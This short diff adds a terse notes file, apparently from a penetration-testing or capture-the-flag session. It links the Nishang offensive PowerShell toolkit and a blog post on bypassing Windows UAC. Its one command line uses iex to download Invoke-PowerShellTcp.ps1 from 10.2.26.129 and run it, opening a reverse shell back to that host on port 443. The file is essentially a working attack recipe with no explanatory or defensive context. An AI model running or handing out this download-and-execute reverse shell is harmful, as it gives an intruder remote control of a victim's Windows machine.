@@ -1,0 +1,9 @@
+https://github.com/samratashok/nishang
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.26.129/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.26.129 -Port 443
+
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+
+
+https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
